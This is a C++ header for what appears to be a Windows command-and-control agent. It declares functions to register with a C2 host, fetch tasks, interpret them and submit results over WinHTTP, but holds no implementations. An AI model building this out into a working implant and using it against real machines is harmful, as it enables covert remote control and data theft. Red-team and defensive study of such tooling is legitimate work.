#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlobj_core.h>
#include <lm.h>
#include <unordered_map>
#include <sstream>
#include "buildoptions.h"
#include "json.hpp"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "netapi32.lib")


namespace network {
    std::wstring MakeHttpRequest(const std::wstring& host, const std::wstring& path, const std::string& data, const std::wstring& method);
}

namespace interpreter {
    std::wstring InterpretTask(std::wstring task);
    
    void* createfilewrap();
        
}

namespace communication {
    nlohmann::json RegisterAgent(const std::wstring& c2_host);
    nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id);
    bool SubmitResults(const std::wstring& c2_host, const std::wstring& agent_id, const nlohmann::json& task_result);

}

namespace misc {
    std::wstring JsonToWString(const nlohmann::json& j);
    nlohmann::json WStringToJson(const std::wstring& wstr);
    std::string WideStringToUTF8(const std::wstring& wstr);
    std::wstring UTF8ToWideString(const std::string& utf8);
}